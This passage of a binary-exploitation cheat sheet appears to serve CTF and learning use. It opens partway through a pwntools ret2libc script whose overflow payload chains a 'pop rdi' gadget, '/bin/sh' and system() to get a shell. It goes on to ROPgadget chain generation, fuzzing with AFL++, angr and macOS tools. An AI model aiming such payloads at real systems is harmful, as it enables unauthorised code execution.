bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
# The offset for this gadget must be found with ROPgadget or similar
rop_pop_rdi = libc.address + 0x000000000002155f # Example gadget offset

log.info(f"system address: {hex(system_addr)}")
log.info(f"/bin/sh address: {hex(bin_sh_addr)}")

# Build the final payload using the calculated addresses
payload = b'A' * 104 # Padding to overflow
payload += p64(rop_pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()
```

#### cfg
```bash
objdump -d binary_name | awk '/^[[:xdigit:]]+:/ {address=$1} /call|jmp|je|jne|jg|jl|jz|jnz/ {print address, $0}'
# Ghidra -> Display Function Graph
```

#### Ghidra

#### GDB Extensions (pwndbg/gef/peda)
```bash
# These extensions greatly enhance GDB for exploit development.
# Installation instructions are specific to each tool.

# Example commands in pwndbg/gef:
heap # ; view heap layout
bins # ; view malloc bins
telescope # ; view a region of memory with context (pointers, strings)
vmmap # ; view memory mapping, similar to /proc/pid/maps
ropper # ; search for ROP gadgets (if integrated)

# Note: Choose one extension (pwndbg, gef, or peda) as they
# generally don't work together. They provide similar core
# features but have different UIs and advanced capabilities.
```

#### ROP Gadgets
```bash
# Tools to find gadgets for Return-Oriented Programming (ROP).
ropper -f binary_name --search "pop rdi; ret"

# ROPgadget basic usage to find all gadgets
ROPgadget --binary binary_name

# Search for specific gadgets
ROPgadget --binary binary_name --only "pop|ret"

# Search for specific strings/bytes in the binary
ROPgadget --binary binary_name --string "/bin/sh"

# Generate a simple ROP chain for execve("/bin/sh", 0, 0)
ROPgadget --binary binary_name --ropchain

# Specify bad characters to avoid in gadget addresses
ROPgadget --binary binary_name --bad-chars "000a"

# Note: These tools are essential for building ROP chains to
# bypass security mitigations like NX (Non-executable stack).
```

#### Exploitation Frameworks
```bash
# pwntools is a powerful Python library for writing exploits.
pip install pwntools
```
```python
# Example pwntools script snippet
from pwn import *

# Start the process
p = process('./binary_name')

# Craft a payload
payload = b'A' * 100
payload += p64(0xdeadbeef) # 64-bit address

# Send the payload
p.sendline(payload)

# Interact with the process
p.interactive()

# Note: pwntools simplifies many tasks like packing/unpacking data,
# interacting with processes, and remote connections.
```

#### Fuzzing
```bash
# AFL++ is a modern, feature-rich fuzzer.

## Instrumented Fuzzing (White-box)
# This is the most effective method. It requires source code to compile
# the binary with instrumentation.
afl-clang-fast -o binary_name_fuzzed source.c
# or for C++
# afl-clang-fast++ -o binary_name_fuzzed source.cpp

# Create input and output directories
mkdir in out
echo "initial seed data" > in/seed.txt

# Run the fuzzer. The '@@' is a placeholder for the input file.
afl-fuzz -i in -o out ./binary_name_fuzzed @@

## Black-box Fuzzing (QEMU mode)
# Use this when you don't have the source code. It's slower.
# The '-Q' flag enables QEMU mode for binary-only targets.
afl-fuzz -Q -i in -o out ./binary_name @@

# Note: Fuzzing is a highly effective technique for discovering
# memory corruption vulnerabilities. Instrumented fuzzing is much
# faster and more efficient than black-box fuzzing.
```

#### Symbolic Execution
```bash
# Angr is a Python framework for symbolic execution and program analysis.
pip install angr
```
```python
# Example Angr script to find a path to a target address
import angr

proj = angr.Project('./binary_name', auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)

# Find a path to a specific address (e.g., a "success" message)
target_address = 0x400800
simgr.explore(find=target_address)

if simgr.found:
    solution_state = simgr.found[0]
    print("Solution found!")
    print(solution_state.posix.dumps(0)) # Dump stdin that leads to the solution
else:
    print("No solution found.")

# Note: Symbolic execution explores program paths to find states
# that satisfy certain conditions. It can be used to solve CTF
# challenges or find vulnerabilities.
```

#### conclusion
```shell
# Section to add what I learnt, what I oberved, what changed
```

---
# macOS Specific Tools (Mach-O binaries)

Your template title mentions "Mac", but the tools are for Linux ELF files. For macOS, you need a different set of tools for the Mach-O binary format.

#### otool
```bash
# The macOS equivalent of ldd and readelf/objdump.
otool -L binary_name # ; list dynamic libraries (like ldd)
otool -tV binary_name # ; disassemble the text section
otool -h binary_name # ; show the header
```

#### lldb
```bash
# The default debugger on macOS.
lldb binary_name
# (lldb) breakpoint set --name main
# (lldb) run
# (lldb) register read
# (lldb) memory read --size 8 --format x 0x12345678
```

#### install_name_tool
```bash
# Used to change dynamic library paths embedded in a binary.
install_name_tool -change /old/path/lib.dylib /new/path/lib.dylib binary_name
```